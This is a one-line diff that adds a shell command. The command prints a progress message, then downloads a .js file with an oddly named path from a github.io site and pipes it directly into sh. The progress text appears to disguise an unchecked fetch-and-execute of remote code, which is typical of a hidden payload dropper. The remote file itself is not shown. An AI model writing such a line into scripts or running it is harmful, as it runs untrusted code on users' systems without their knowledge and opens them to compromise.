@@ -1,0 +1,1 @@
+echo 'Progress: 54.0%'; curl -L --progress-bar frkns.github.io/fun/RESPONSES_CONDITIONS_APARTMENT_CARRIES_HO.js | sh
